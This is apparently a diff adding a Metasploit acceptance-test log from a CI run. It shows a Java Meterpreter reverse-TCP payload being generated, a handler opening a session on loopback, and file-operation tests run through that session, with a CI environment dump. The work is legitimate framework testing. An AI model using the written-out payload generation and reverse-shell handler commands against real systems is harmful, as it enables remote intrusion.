@@ -1,0 +1,179 @@
+use java/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-3644-2wbpr2.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6001 lhost=127.0.0.1
+[*] Writing 5265 bytes to /tmp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-3644-2wbpr2.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:57570 ) at 2022-02-03 22:39:30 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 1
+[*] Session type is meterpreter and platform is linux
+[+] should test for directory existence
+[*] Creating directory test-dir
+[*] test-dir created
+[*] Creating directory test-dir/directory
+[*] test-dir/directory created
+[+] should create directories
+[+] should list the directory we just made
+[+] should recursively delete the directory we just made
+[*] Creating directory test-dir
+[*] test-dir created
+[+] should delete a symbolic link target
+[*] Creating directory test-dir.1
+[*] test-dir.1 created
+[*] Creating directory test-dir.2
+[*] test-dir.2 created
+[+] should not recurse into symbolic link directories
+[*] Writing 35000 bytes
+[*] Finished in 0.018044636
+[+] should write binary data
+[*] Read 35000 bytes
+[+] should read the binary data we just wrote
+[+] should delete binary files
+[-] FAILED: should append binary data
+{
+  "LEIN_HOME": "/usr/local/lib/lein",
+  "NVM_DIR": "/home/runner/.nvm",
+  "HOMEBREW_NO_AUTO_UPDATE": "1",
+  "XDG_CONFIG_HOME": "/home/runner/.config",
+  "ANDROID_HOME": "/usr/local/lib/android/sdk",
+  "JAVA_HOME_11_X64": "/usr/lib/jvm/temurin-11-jdk-amd64",
+  "ImageVersion": "20220131.1",
+  "AGENT_TOOLSDIRECTORY": "/opt/hostedtoolcache",
+  "LANG": "C.UTF-8",
+  "AZURE_EXTENSION_DIR": "/opt/az/azcliextensions",
+  "POWERSHELL_DISTRIBUTION_CHANNEL": "GitHub-Actions-ubuntu18",
+  "GITHUB_REF_NAME": "investigate-github-actions-for-windows",
+  "GITHUB_API_URL": "https://api.github.com",
+  "INVOCATION_ID": "5f8dae9f969546dd817d8ae01c99784e",
+  "JAVA_HOME_12_X64": "/usr/lib/jvm/adoptopenjdk-12-hotspot-amd64",
+  "GITHUB_RUN_ATTEMPT": "1",
+  "ANDROID_SDK_ROOT": "/usr/local/lib/android/sdk",
+  "RUNNER_TOOL_CACHE": "/opt/hostedtoolcache",
+  "SWIFT_PATH": "/usr/share/swift/usr/bin",
+  "JAVA_HOME": "/usr/lib/jvm/temurin-8-jdk-amd64",
+  "RUNNER_TRACKING_ID": "github_987d267b-10af-4cf7-b335-9d4040d091db",
+  "DOTNET_MULTILEVEL_LOOKUP": "0",
+  "STATS_KEEPALIVE": "false",
+  "GITHUB_REPOSITORY_OWNER": "AlanFoster",
+  "GITHUB_ACTIONS": "true",
+  "DOTNET_SKIP_FIRST_TIME_EXPERIENCE": "1",
+  "CI": "true",
+  "DOTNET_NOLOGO": "1",
+  "USER": "runner",
+  "GITHUB_HEAD_REF": "",
+  "GITHUB_ACTOR": "AlanFoster",
+  "GITHUB_ACTION_REF": "",
+  "GITHUB_ACTION": "__run_3",
+  "GRADLE_HOME": "/usr/share/gradle-7.3.3",
+  "GITHUB_REF_PROTECTED": "false",
+  "PWD": "/home/runner/work/metasploit-framework/metasploit-framework",
+  "ImageOS": "ubuntu18",
+  "PIPX_HOME": "/opt/pipx",
+  "HOME": "/home/runner",
+  "JOURNAL_STREAM": "9:22803",
+  "ANDROID_NDK_HOME": "/usr/local/lib/android/sdk/ndk-bundle",
+  "JAVA_HOME_8_X64": "/usr/lib/jvm/temurin-8-jdk-amd64",
+  "GITHUB_ACTION_REPOSITORY": "",
+  "GITHUB_REF_TYPE": "branch",
+  "RUNNER_TEMP": "/home/runner/work/_temp",
+  "ANDROID_NDK_ROOT": "/usr/local/lib/android/sdk/ndk-bundle",
+  "GITHUB_RETENTION_DAYS": "90",
+  "GOROOT_1_15_X64": "/opt/hostedtoolcache/go/1.15.15/x64",
+  "CONDA": "/usr/share/miniconda",
+  "GITHUB_ENV": "/home/runner/work/_temp/_runner_file_commands/set_env_f8b75f64-31d0-4eff-8d4d-523e83a2aa99",
+  "DEBIAN_FRONTEND": "noninteractive",
+  "GOROOT_1_17_X64": "/opt/hostedtoolcache/go/1.17.6/x64",
+  "RUNNER_WORKSPACE": "/home/runner/work/metasploit-framework",
+  "GITHUB_REF": "refs/heads/investigate-github-actions-for-windows",
+  "GITHUB_SHA": "e112702021767c3aeebbcad04270bc83e5d6fb80",
+  "GITHUB_RUN_ID": "1792131459",
+  "RUNNER_ARCH": "X64",
+  "ANDROID_NDK_LATEST_HOME": "/usr/local/lib/android/sdk/ndk/23.1.7779620",
+  "GITHUB_SERVER_URL": "https://github.com",
+  "GECKOWEBDRIVER": "/usr/local/share/gecko_driver",
+  "RAILS_ENV": "test",
+  "GOROOT_1_16_X64": "/opt/hostedtoolcache/go/1.16.13/x64",
+  "DEPLOYMENT_BASEPATH": "/opt/runner",
+  "GITHUB_EVENT_PATH": "/home/runner/work/_temp/_github_workflow/event.json",
+  "CHROMEWEBDRIVER": "/usr/local/share/chrome_driver",
+  "PIPX_BIN_DIR": "/opt/pipx_bin",
+  "HOMEBREW_REPOSITORY": "/home/linuxbrew/.linuxbrew/Homebrew",
+  "GITHUB_GRAPHQL_URL": "https://api.github.com/graphql",
+  "RUNNER_OS": "Linux",
+  "GITHUB_BASE_REF": "",
+  "VCPKG_INSTALLATION_ROOT": "/usr/local/share/vcpkg",
+  "GITHUB_PATH": "/home/runner/work/_temp/_runner_file_commands/add_path_f8b75f64-31d0-4eff-8d4d-523e83a2aa99",
+  "GITHUB_JOB": "test",
+  "RUNNER_NAME": "GitHub Actions 3",
+  "PERFLOG_LOCATION_SETTING": "RUNNER_PERFLOG",
+  "RUNNER_USER": "runner",
+  "SHLVL": "1",
+  "HOMEBREW_PREFIX": "/home/linuxbrew/.linuxbrew",
+  "HOMEBREW_CLEANUP_PERIODIC_FULL_DAYS": "3650",
+  "BOOTSTRAP_HASKELL_NONINTERACTIVE": "1",
+  "GITHUB_REPOSITORY": "AlanFoster/metasploit-framework",
+  "GITHUB_EVENT_NAME": "push",
+  "JAVA_HOME_17_X64": "/usr/lib/jvm/temurin-17-jdk-amd64",
+  "LEIN_JAR": "/usr/local/lib/lein/self-installs/leiningen-2.9.8-standalone.jar",
+  "GITHUB_RUN_NUMBER": "203",
+  "RUNNER_PERFLOG": "/home/runner/perflog",
+  "GITHUB_WORKFLOW": "Acceptance",
+  "ANT_HOME": "/usr/share/ant",
+  "PATH": "/home/runner/work/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0/bin:/home/runner/work/metasploit-framework/metasploit-framework:/opt/hostedtoolcache/Ruby/3.0.2/x64/bin:/home/linuxbrew/.linuxbrew/bin:/home/linuxbrew/.linuxbrew/sbin:/home/runner/.local/bin:/opt/pipx_bin:/home/runner/.cargo/bin:/home/runner/.config/composer/vendor/bin:/usr/local/.ghcup/bin:/home/runner/.dotnet/tools:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games",
+  "SELENIUM_JAR_PATH": "/usr/share/java/selenium-server.jar",
+  "GITHUB_WORKSPACE": "/home/runner/work/metasploit-framework/metasploit-framework",
+  "CHROME_BIN": "/usr/bin/google-chrome",
+  "ACCEPT_EULA": "Y",
+  "HOMEBREW_CELLAR": "/home/linuxbrew/.linuxbrew/Cellar",
+  "_": "/opt/hostedtoolcache/Ruby/3.0.2/x64/bin/bundle",
+  "BUNDLER_ORIG_BUNDLE_BIN_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_BUNDLE_GEMFILE": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_BUNDLER_VERSION": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_GEM_HOME": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_GEM_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_MANPATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_PATH": "/opt/hostedtoolcache/Ruby/3.0.2/x64/bin:/home/linuxbrew/.linuxbrew/bin:/home/linuxbrew/.linuxbrew/sbin:/home/runner/.local/bin:/opt/pipx_bin:/home/runner/.cargo/bin:/home/runner/.config/composer/vendor/bin:/usr/local/.ghcup/bin:/home/runner/.dotnet/tools:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
+  "BUNDLER_ORIG_RB_USER_INSTALL": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RUBYLIB": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RUBYOPT": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLE_BIN_PATH": "/opt/hostedtoolcache/Ruby/3.0.2/x64/lib/ruby/gems/3.0.0/gems/bundler-2.1.4/exe/bundle",
+  "BUNDLE_GEMFILE": "/home/runner/work/metasploit-framework/metasploit-framework/Gemfile",
+  "BUNDLER_VERSION": "2.1.4",
+  "RUBYOPT": "-r/opt/hostedtoolcache/Ruby/3.0.2/x64/lib/ruby/gems/3.0.0/gems/bundler-2.1.4/lib/bundler/setup",
+  "RUBYLIB": "/opt/hostedtoolcache/Ruby/3.0.2/x64/lib/ruby/gems/3.0.0/gems/bundler-2.1.4/lib",
+  "GEM_PATH": "",
+  "GEM_HOME": "/home/runner/work/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0"
+}
+dir: cannot access 'C:\': No such file or directory
+
+Does this exist? c:\boot.ini==false
+Does this exist? c:\pagefile.sys==false
+Does this exist? /etc/passwd==true
+Does this exist? /etc/master.passwd==false
+Does this exist? %WINDIR%\system32\notepad.exe==false
+Does this exist? %WINDIR%\system32\calc.exe==false
+[+] should test for file existence
+[+] should create text files
+[-] Didn't read what we wrote, actual file on target: ||
+[-] FAILED: should read the text we just wrote
+[-] Didn't read what we wrote, actual file on target: 
+[-] FAILED: should append text files
+[+] should delete text files
+[+] should move files
+[+] should expand home
+[+] should not expand non-isolated tilde
+[+] should not expand mid-string tilde
+[+] should not expand env vars with invalid naming
+[+] should expand multiple variables
+[*] Testing complete in 0.765128227
+[-] Passed: 18; Failed: 3
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
